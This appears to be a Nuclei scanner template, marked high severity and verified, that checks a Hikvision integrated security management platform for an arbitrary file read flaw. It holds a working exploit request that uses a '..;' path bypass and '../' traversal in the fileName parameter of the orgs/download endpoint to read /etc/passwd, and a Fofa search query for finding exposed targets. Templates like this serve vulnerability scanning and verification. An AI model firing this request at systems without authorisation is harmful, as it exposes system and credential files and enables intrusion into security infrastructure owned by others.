id: HIKVISION_center_download_Fileread

info:
  name: HIKVISION_center_download_Fileread
  author: HK
  severity: high
  description: 海康威视综合安防系统/center/api/task/..;/orgManage/v1/orgs/download接口存在任意文件读取漏洞
  metadata:
    max-request: 1
    Fofa-query: title="综合安防管理平台"
    verified: true
http:
- raw:
  - |+
    @timeout: 30s
    GET /center/api/task/..;/orgManage/v1/orgs/download?fileName=../../../../../../../etc/passwd HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36

  max-redirects: 3
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
      - root